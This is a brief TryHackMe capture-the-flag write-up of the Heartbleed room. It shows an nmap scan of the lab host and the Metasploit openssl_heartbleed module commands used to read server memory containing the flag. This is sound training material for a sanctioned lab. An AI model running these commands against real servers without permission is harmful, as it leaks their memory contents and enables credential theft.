---
clayout: ctf
title: Heartbleed
type: TryHackMe
date: 2025-09-14
level: Easy
icon: /ctf/tryhackme/heart-bleed/icon-room.png
image: /ctf/tryhackme/heart-bleed/icon-room.png
description: SSL issues are still lurking in the wild! Can you exploit this web servers OpenSSL?
ctf-link: https://tryhackme.com/room/heartbleed
---

## Challenge Overview

The target machine hosts several exposed services, including an outdated version of OpenSSL. According to the room’s description, this version is vulnerable to the Heartbleed bug (CVE-2014-0160), which allows an attacker to read arbitrary memory from the server.

## Enumeration

### Nmap Scan

We start by scanning all TCP ports with service:

```bash
nmap -sV -sC -p- -oN nmap.txt 34.245.74.198
```

**Results:**

```bash
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4 (protocol 2.0)
111/tcp   open  rpcbind  2-4 (RPC #100000)
443/tcp   open  ssl/http nginx 1.15.7
42967/tcp open  status   1 (RPC #100024)
```

* **22/SSH** – OpenSSH 7.4 (no immediate indication of a weakness).
* **111/RPCbind** – Typically part of NFS or other RPC services.
* **443/HTTPS** – nginx 1.15.7 with a certificate issued to *localhost*. This service is the most interesting, as it is likely tied to the Heartbleed vulnerability.
* **42967/Status** – RPC status service.

From the challenge description, we know OpenSSL is used on this host, and the version is vulnerable to Heartbleed. This makes port **443/tcp** our primary target.

## Exploitation

### Heartbleed Attack

We can verify and exploit the Heartbleed vulnerability using Metasploit’s auxiliary module:

```bash
msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 34.245.74.198
set VERBOSE true
run
```

**Result:**

![Heartbleed exploit running](/ctf/tryhackme/heart-bleed/heartbleed.png)

The exploit successfully retrieves chunks of server memory with the flag.
